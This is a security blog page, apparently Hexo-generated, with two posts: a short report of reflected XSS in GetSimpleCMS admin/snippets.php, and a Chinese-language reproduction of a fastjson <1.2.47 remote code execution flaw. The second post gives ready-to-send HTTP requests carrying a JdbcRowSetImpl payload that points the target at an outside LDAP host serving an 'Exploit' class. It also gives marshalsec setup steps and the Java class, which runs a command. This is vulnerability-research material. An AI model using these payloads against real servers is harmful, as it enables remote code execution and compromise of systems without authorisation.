    <a href="/2019/09/05/Reflective-xss-on-admin-snippets-php/" class="article-date">
  <time datetime="2019-09-05T02:45:43.000Z" itemprop="datePublished">2019-09-05</time>
</a>
    
    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <p>I installed GetSimpleCMS and found that xss exists in admin/snippets.php, and script and html are not filtered in the title of the editing Snippet.</p>
<p>Enter Payload</p>
<p><img src="https://i.loli.net/2019/09/05/ElOMruTzGVWH4S8.png" alt="xss1.png"></p>
<p>Code<br><img src="https://i.loli.net/2019/09/05/QvVaIFtOdcSGz3h.png" alt="xss.png"></p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-fastjson-1-2-47-RCE-漏洞复现" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/27/fastjson-1-2-47-RCE-漏洞复现/">fastjson&lt;1.2.47 RCE 漏洞复现</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/08/27/fastjson-1-2-47-RCE-漏洞复现/" class="article-date">
  <time datetime="2019-08-27T01:41:52.000Z" itemprop="datePublished">2019-08-27</time>
</a>
    
    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <p>author：test<br><strong>Ox01 具体环境</strong><br>War包部署在tomcat,war包使用fastjson解析库<br>tomcat版本<br><img src="https://i.loli.net/2019/08/27/2K7oDWtaXfJQLRZ.png" alt="图"><br>java版本<br><img src="https://i.loli.net/2019/08/27/sEuCnxq9ywDjoXc.png" alt="图"></p>
<p><strong>0x02 尝试是否可以接受请求（也可以没有这一步）</strong><br>先尝试是否可以收到ldap请求<br>post数据包如下：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">POST /fastjson/ HTTP/1.1</span><br><span class="line">Host: x.x.x.x:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 215</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;:&#123;</span><br><span class="line">   &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">   &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;f&quot;:&#123;      </span><br><span class="line">&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://x.x.x.x:8080/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>发送数据报：<br><img src="https://i.loli.net/2019/08/28/qSNUrFeazAE9D1O.png" alt="D518D79A-05ED-4BCF-9B43-1F208FAEB7B7.png"><br>服务端接口请求：<br><img src="https://i.loli.net/2019/08/28/nXfgcxB52t1zWGs.png" alt="图"></p>
<p><strong>Ox03 构造数据包以及工具</strong><br>1 用到的工具： <a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a><br>2 使用maven打包，具体为cd到目录然后 mvn clean package -DskipTests<br>3 构造数据包<br>post数据包如下：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">POST /fastjson/ HTTP/1.1</span><br><span class="line">Host: 10.x.x.x:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 215</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;:&#123;</span><br><span class="line">   &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">   &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;f&quot;:&#123;      </span><br><span class="line">&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://10.x.x.x:1389/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>4 构造的恶意java类，需要javac编译成class文件，存放于http服务器，ldap服务指向于http服务<br>代码命名为：Exploit.java</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class Exploit &#123;</span><br><span class="line">    public Exploit()&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime ().exec ( &quot;calc&quot; );</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace ();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Exploit e=new Exploit ();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>编译此java文件<br><img src="https://i.loli.net/2019/08/28/zCHtumkTcDaywFr.png" alt="图"><br><strong>0x04 启动服务，验证是否 可以执行命令</strong><br>启动各类服务<br><img src="https://i.loli.net/2019/08/28/jPMmU4wk2dvY6VS.png" alt="36602945-99DE-4243-87EB-E23C58457AF8.png"><br>发送数据包<br><img src="https://i.loli.net/2019/08/28/ul5kdwaSCtj8Ghr.png" alt="test.png"><br>执行成功<br><img src="https://i.loli.net/2019/08/28/rlUNhKzpy72SsQa.png" alt="9C7899A6-2E6A-42CB-94E0-D9F82C37416A.png"></p>

      
    </div>
    
  </div>
  
  
</article>

  



</section>
        <aside id="sidebar">
  
    <div class="widget-box">
  <div class="avatar-box">
    <img class="avatar" src="/images/code-title.png" title="为了更安全的互联网"></img>
    <h3 class="avatar-name">
      
        泰斯特
      
    </h3>
    <p class="avatar-slogan">
      搬砖工程师。
    </p>
  </div>
</div>


  
    

  
    

  
    
  
    
  <div class="widget-box">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li></ul>
    </div>
  </div>

  
    
  <div class="widget-box">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2019/10/20/Java注解/">Java注解</a>
          </li>
        
          <li>
            <a href="/2019/10/13/SQL-injection-in-Gila-CMS-version-1-11-4/">SQL injection in Gila CMS version 1.11.4</a>
          </li>
        
          <li>
            <a href="/2019/10/12/Bypass-the-HTML-file-suffix-restriction-when-uploading-files/">Bypass the HTML file suffix restriction when uploading files</a>
          </li>
        
          <li>
            <a href="/2019/09/22/正则表达式总结和引起的思考/">正则表达式总结和引起的思考</a>
          </li>
        
          <li>
            <a href="/2019/09/05/Reflective-xss-on-admin-snippets-php/">Reflective xss on admin/snippets.php</a>
          </li>
        
      </ul>
    </div>
  </div>

  
      <div class="widget-box">
    <h3 class="widget-title">友链</h3>
    <div class="widget">
      
        <a style="display: block;" href="https://blog.ssssdl.xyz/" title target='_blank'
        >ssssdl</a>
      
        <a style="display: block;" href="https://lingwu111.github.io/" title target='_blank'
        >lingwu</a>
      
    </div>
  </div>

  
</aside>
      </div>
      <footer id="footer">
  <div class="foot-box global-width">
    &copy; 2019 test &nbsp;&nbsp;
    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    &nbsp;|&nbsp;主题 <a href="https://github.com/yiluyanxia/hexo-theme-antiquity">antiquity</a>
    <br>
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span id="busuanzi_container_site_pv">不蒜子告之   阁下是第<span id="busuanzi_value_site_pv"></span>个访客</span>
  </div>
</footer>
      <script src="https://code.jquery.com/jquery-2.0.3.min.js"></script>
<script>
if (!window.jQuery) {
var script = document.createElement('script');
script.src = "/js/jquery-2.0.3.min.js";
document.body.write(script);
}
</script>

  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



    </div>
    <nav id="mobile-nav" class="mobile-nav-box">
  <div class="mobile-nav-img mobile-nav-top"></div>
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
  <div class="mobile-nav-img  mobile-nav-bottom"></div>
</nav>    
  </div>
</body>
</html>